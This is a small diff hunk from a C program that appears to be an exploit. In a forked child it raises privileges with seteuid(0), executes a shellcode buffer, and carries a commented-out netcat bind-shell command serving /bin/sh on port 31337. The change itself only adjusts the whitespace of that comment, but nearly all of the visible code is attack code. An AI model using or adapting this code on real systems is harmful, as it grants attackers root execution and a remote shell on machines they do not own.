@@ -55,7 +55,7 @@ int main (void){
 		case 0: {
 		        	seteuid(0);
               (*(void(*)()) shellcode)();
-			        //system(nc -lp 31337 -e /bin//sh);
+	      //system(nc -lp 31337 -e /bin//sh);
 		}
 		default:{
 			wait(NULL);
